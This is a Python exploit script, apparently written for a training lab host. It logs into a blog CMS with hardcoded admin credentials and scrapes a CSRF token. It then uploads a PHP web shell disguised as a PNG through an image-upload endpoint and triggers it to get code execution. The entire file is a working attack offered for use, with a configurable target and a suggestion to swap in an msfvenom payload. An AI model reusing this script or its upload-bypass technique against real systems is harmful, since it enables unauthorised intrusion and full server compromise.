```python
import requests
import base64
import sys
from urllib.parse import urljoin
import os

# CONFIG
TARGET = "http://blog.inlanefreight.local/"  # Change this
USERNAME = "admin"
PASSWORD = "admin123!@#"

# PHP payload to execute commands (you can replace it with msfvenom payload)

def get_php_payload():
    if os.path.exists(r'./shell.php'):
        with open('shell.php', 'r') as f:
            return f.read()
    else:
        print("[-] No shell.php file found")
        exit(1)


PHP_PAYLOAD = get_php_payload()

def get_csrf_token_and_cookie(session, target_uri):
    print("[*] Getting CSRF token and session cookie...")
    r = session.get(target_uri)
    if r.status_code != 200:
        print("[!] Failed to load main page")
        return None, None

    token_split = r.text.split('":"')
    if len(token_split) < 2:
        print("[!] CSRF token not found")
        return None, None

    token = token_split[1].split('"')[0]
    print(f"[+] CSRF Token: {token}")
    return token, session.cookies.get_dict()

def login(session, target_uri, username, password, token):
    print("[*] Logging in...")
    ajax_uri = urljoin(target_uri, "ajax.php")
    headers = {
        'Csrf-Token': token
    }
    data = {
        'action': 'login',
        'nick': username,
        'pass': password
    }
    r = session.post(ajax_uri, headers=headers, data=data)
    if r.status_code == 200 and 'error' not in r.text:
        print("[+] Login successful")
        return True
    else:
        print("[!] Login failed")
        return False

def upload_shell(session, target_uri, token, php_payload):
    print("[*] Uploading shell...")
    ajax_uri = urljoin(target_uri, "ajax.php?action=upload_image")
    headers = {
        'Csrf-Token': token
    }

    # Fake PNG + PHP payload
    fake_png = base64.b64decode("iVBORw0KGgoAAAANSUhEUgAAABgAAAAbCAIAAADpgdgBAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAJElEQVQ4")
    evil_file_content = fake_png + php_payload.encode()
    files = {
        'file': ('mia.php', evil_file_content, 'image/png')
    }

    r = session.post(ajax_uri, headers=headers, files=files)
    if r.status_code == 200:
        json_resp = r.json()
        if 'path' in json_resp:
            shell_path = json_resp['path']
            print(f"[+] Shell uploaded to: {shell_path}")
            return shell_path
        else:
            print("[!] Failed to parse JSON or missing path")
    else:
        print(f"[!] Upload failed. Status code: {r.status_code}")
    return None

def trigger_shell(session, target_uri, shell_path):
    shell_url = urljoin(target_uri, shell_path)
    print(f"[*] Triggering shell at {shell_url}")
    r = session.get(shell_url)
    if r.status_code == 200:
        print("[+] Shell triggered successfully!")
    else:
        print("[!] Failed to trigger shell")

def main():
    session = requests.Session()
    target_uri = TARGET.rstrip("/") + "/"

    token, cookies = get_csrf_token_and_cookie(session, target_uri)
    if not token or not cookies:
        return

    if not login(session, target_uri, USERNAME, PASSWORD, token):
        return

    shell_path = upload_shell(session, target_uri, token, PHP_PAYLOAD)
    if not shell_path:
        return

    trigger_shell(session, target_uri, shell_path)

if __name__ == "__main__":
    main()

```